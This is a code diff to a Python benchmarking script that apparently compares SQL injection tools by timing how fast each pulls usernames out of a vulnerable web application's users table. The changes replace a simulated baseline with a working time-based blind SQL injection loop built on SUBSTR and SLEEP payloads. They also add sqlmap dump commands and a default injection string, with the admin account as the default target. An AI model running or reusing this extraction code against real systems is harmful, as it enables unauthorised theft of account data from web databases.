@@ -7,6 +7,9 @@ import time
 import subprocess
 import json
 import statistics
+import requests
+import re
+import shutil
 from typing import Dict, List
 from pathlib import Path
 import sys
@@ -20,7 +23,7 @@ from statsqli.main import StatSQLi
 class BenchmarkRunner:
     """Runs benchmarks comparing different SQL injection tools."""
     
-    def __init__(self, target_url: str, test_payload: str, iterations: int = 5):
+    def __init__(self, target_url: str, test_payload: str, iterations: int = 5, user_id: int = 1):
         """
         Initialize benchmark runner.
         
@@ -28,10 +31,12 @@ class BenchmarkRunner:
             target_url: Vulnerable URL to test
             test_payload: Payload template to use
             iterations: Number of iterations per tool
+            user_id: User ID to extract (default: 1 for admin)
         """
         self.target_url = target_url
         self.test_payload = test_payload
         self.iterations = iterations
+        self.user_id = user_id
         self.results: Dict[str, List[float]] = {
             'statsqli': [],
             'sqlmap': [],
@@ -54,10 +59,11 @@ class BenchmarkRunner:
                     delay=2.0,
                     parallel=True
                 )
+                # Extract specific user by ID (user_id - 1 because LIMIT is 0-indexed)
                 result = tool.extract_string_custom(
                     table="users",
                     column="username",
-                    where_clause="1=1 LIMIT 0,1",
+                    where_clause=f"id={self.user_id} LIMIT 0,1",
                     max_length=20
                 )
                 
@@ -76,8 +82,30 @@ class BenchmarkRunner:
         print("[*] Benchmarking SQLMap...")
         times = []
         
-        # Note: SQLMap needs to be installed separately
-        sqlmap_path = "sqlmap"  # Adjust if needed
+        # Try to find SQLMap in multiple ways
+        sqlmap_path = None
+        import shutil
+        
+        # Try direct sqlmap command
+        if shutil.which("sqlmap"):
+            sqlmap_path = "sqlmap"
+        # Try python3 -m sqlmap
+        elif shutil.which("python3"):
+            try:
+                result = subprocess.run(
+                    ["python3", "-m", "sqlmap", "--version"],
+                    capture_output=True,
+                    timeout=5
+                )
+                if result.returncode == 0:
+                    sqlmap_path = "python3"
+                    sqlmap_module = "-m sqlmap"
+            except:
+                pass
+        
+        if sqlmap_path is None:
+            print("  [!] SQLMap not found. Install it with: pip3 install sqlmap")
+            return [float('inf')] * self.iterations
         
         for i in range(self.iterations):
             print(f"  [*] Iteration {i+1}/{self.iterations}")
@@ -85,16 +113,31 @@ class BenchmarkRunner:
             
             try:
                 # SQLMap command for time-based extraction
-                cmd = [
-                    sqlmap_path,
-                    "-u", self.target_url,
-                    "--technique=T",
-                    "--batch",
-                    "--dump", "--dump-format=JSON",
-                    "-T", "users",
-                    "-C", "username",
-                    "--limit=1"
-                ]
+                # Note: SQLMap will extract all users, but we time it for comparison
+                if sqlmap_path == "python3":
+                    cmd = [
+                        "python3", "-m", "sqlmap",
+                        "-u", self.target_url,
+                        "--technique=T",
+                        "--batch",
+                        "--dump", "--dump-format=JSON",
+                        "-T", "users",
+                        "-C", "username",
+                        "--where", f"id={self.user_id}",
+                        "--limit=1"
+                    ]
+                else:
+                    cmd = [
+                        sqlmap_path,
+                        "-u", self.target_url,
+                        "--technique=T",
+                        "--batch",
+                        "--dump", "--dump-format=JSON",
+                        "-T", "users",
+                        "-C", "username",
+                        "--where", f"id={self.user_id}",
+                        "--limit=1"
+                    ]
                 
                 result = subprocess.run(
                     cmd,
@@ -120,27 +163,91 @@ class BenchmarkRunner:
     
     def benchmark_manual(self) -> List[float]:
         """
-        Benchmark manual extraction (simulated linear search).
-        This represents a baseline without optimizations.
+        Benchmark manual/traditional extraction (actual linear search).
+        This represents traditional method: linear character search with threshold-based detection.
         """
-        print("[*] Benchmarking manual/baseline extraction...")
+        print("[*] Benchmarking manual/traditional extraction...")
         times = []
         
-        # Simulate manual extraction (linear character search)
         for i in range(self.iterations):
             print(f"  [*] Iteration {i+1}/{self.iterations}")
             start = time.time()
             
-            # Simulate: manual tools typically use linear search
-            # For 20 character string with 95 possible chars each = ~1900 requests
-            # At ~3 seconds per request = ~5700 seconds = ~95 minutes
-            # We'll use a simplified simulation
-            simulated_time = 95 * 60  # Conservative estimate
-            time.sleep(1)  # Minimal actual delay
-            
-            elapsed = simulated_time
-            times.append(elapsed)
-            print(f"  [+] Simulated completion in {elapsed:.2f}s (estimated)")
+            try:
+                # Traditional method: linear search with simple threshold
+                session = requests.Session()
+                
+                # Extract base URL
+                if '?' in self.target_url:
+                    url = self.target_url.split('?')[0]
+                else:
+                    url = self.target_url
+                
+                # Establish baseline (simple average, no statistics)
+                baseline_times = []
+                baseline_payload = self.test_payload.format(condition="1=0")
+                for _ in range(5):
+                    req_start = time.time()
+                    try:
+                        session.get(url, params={'id': baseline_payload}, timeout=30)
+                    except requests.RequestException:
+                        pass
+                    baseline_times.append(time.time() - req_start)
+                baseline_avg = sum(baseline_times) / len(baseline_times)
+                threshold = baseline_avg + 1.5  # Simple threshold (1.5s above baseline)
+                
+                # Extract string using linear search (traditional method)
+                result = ""
+                max_length = 20
+                
+                for pos in range(1, max_length + 1):
+                    char_found = False
+                    
+                    # Linear search through printable ASCII (32-126)
+                    for ascii_val in range(32, 127):
+                        # Test if character equals this ASCII value
+                        # Use same query as StatSQLi benchmark (extract specific user by ID)
+                        char_query = f"UNICODE(SUBSTR((SELECT username FROM users WHERE id={self.user_id} LIMIT 0,1), {pos}, 1))"
+                        condition = f"{char_query} = {ascii_val}"
+                        
+                        # Build payload
+                        if "SLEEP" in self.test_payload.upper():
+                            payload_template = re.sub(
+                                r'SLEEP\([0-9.]+\)',
+                                'SLEEP(2)',
+                                self.test_payload,
+                                flags=re.IGNORECASE
+                            )
+                            payload = payload_template.format(condition=condition)
+                        else:
+                            payload = self.test_payload.format(
+                                condition=f"({condition}) AND SLEEP(2)"
+                            )
+                        
+                        # Make request and measure time
+                        req_start = time.time()
+                        try:
+                            session.get(url, params={'id': payload}, timeout=30)
+                        except requests.RequestException:
+                            pass
+                        elapsed = time.time() - req_start
+                        
+                        # Simple threshold check (traditional method)
+                        if elapsed > threshold:
+                            result += chr(ascii_val)
+                            char_found = True
+                            break
+                    
+                    if not char_found:
+                        break  # End of string
+                
+                elapsed = time.time() - start
+                times.append(elapsed)
+                print(f"  [+] Completed in {elapsed:.2f}s - Extracted: {result}")
+                
+            except Exception as e:
+                print(f"  [!] Error: {e}")
+                times.append(float('inf'))
         
         return times
     
@@ -213,6 +320,7 @@ class BenchmarkRunner:
         output = {
             'target_url': self.target_url,
             'iterations': self.iterations,
+            'user_id': self.user_id,
             'summary': summary,
             'raw_times': self.results
         }
@@ -233,12 +341,15 @@ def main():
                        default="' OR ({condition}) -- -")
     parser.add_argument('--iterations', '-i', type=int, default=5,
                        help='Number of iterations per tool')
+    parser.add_argument('--user-id', '-u', type=int, default=1,
+                       help='User ID to extract (default: 1 for admin)')
     parser.add_argument('--output', '-o', default='benchmark_results.json',
                        help='Output JSON file')
     
     args = parser.parse_args()
     
-    runner = BenchmarkRunner(args.url, args.payload, args.iterations)
+    print(f"[*] Benchmarking extraction for user ID: {args.user_id}")
+    runner = BenchmarkRunner(args.url, args.payload, args.iterations, args.user_id)
     summary = runner.run_all_benchmarks()
     runner.print_results(summary)
     runner.save_results(summary, args.output)
